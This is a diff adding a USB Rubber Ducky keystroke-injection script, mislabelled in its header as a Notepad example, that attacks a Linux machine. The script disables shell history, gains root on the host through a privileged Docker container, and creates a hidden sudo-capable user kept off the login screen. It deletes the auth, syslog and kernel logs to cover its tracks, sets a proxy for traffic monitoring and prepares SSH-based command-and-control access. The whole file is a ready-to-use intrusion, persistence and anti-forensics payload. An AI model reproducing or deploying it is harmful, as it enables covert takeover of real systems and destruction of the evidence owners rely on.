@@ -1,0 +1,99 @@
+REM An example Windows script to open a Notepad and enter text
+REM
+REM Let the Ducky HID enumerate
+DELAY 10000
+REM Windows
+GUI
+STRING terminal
+DELAY 2000
+ENTER
+DELAY 2500
+F11
+REM Turn off logging for user bash history file
+STRING unset HISTFILE
+ENTER
+DELAY 500
+
+REM Run a docker container which mounts to the host system and has root access
+STRING docker run -it --name escape --privileged -v /:/host ubuntu chroot /host
+ENTER
+DELAY 25000
+
+REM Add a new user to the system with a hidden directory
+STRING adduser --home /etc/hidden hidden
+ENTER 
+DELAY 500
+STRING hidden
+ENTER
+DELAY 1000
+STRING hidden
+ENTER
+DELAY 500
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+ENTER 
+DELAY 500
+STRING y
+ENTER
+DELAY 500
+
+
+REM Remove authentication logs which show evidence of a user being created and also shows evidence of docker being run
+STRING rm -r /var/log/auth.log
+ENTER
+DELAY 500
+STRING rm -r /var/log/syslog
+ENTER
+DELAY 500
+STRING rm -r /var/log/kern.log
+ENTER
+DELAY 500
+
+REM Adding the new user to relevant groups, also giving them an ID below 1000 so that the system doesnt show the user in the login screen
+STRING usermod -aG sudo -u 982 hidden
+ENTER
+DELAY 500
+STRING usermod -aG docker hidden
+ENTER 
+DELAY 500
+
+REM Exiting from root
+STRING exit 
+ENTER
+DELAY 500
+
+REM Removing evidence of a container being run on the system
+STRING docker rm escape
+ENTER 
+DELAY 500
+
+REM Setting the user account to have a http proxy and https proxy which routes back to itself, allowing for attacker to monitor traffic.
+STRING export http_proxy=http://127.0.0.1:8080/
+ENTER
+DELAY 500
+STRING export https_proxy=http://127.0.0.1:8080/
+ENTER
+DELAY 500
+
+REM Get address of the machine, so can ssh into the account and command and control
+STRING ping 192.168.5.157 -c 3
+ENTER
+DELAY 2000
+
+REM Make database which chromium uses to check for valid ca certificates
+STRING mkdir -p .pki/nssdb
+ENTER
+DELAY 500
+STRING certutil -d .pki/nssdb -N --empty-password
+ENTER
+DELAY 500 
+
+REM Remove the terminal from the screen
+STRING exit
+ENTER
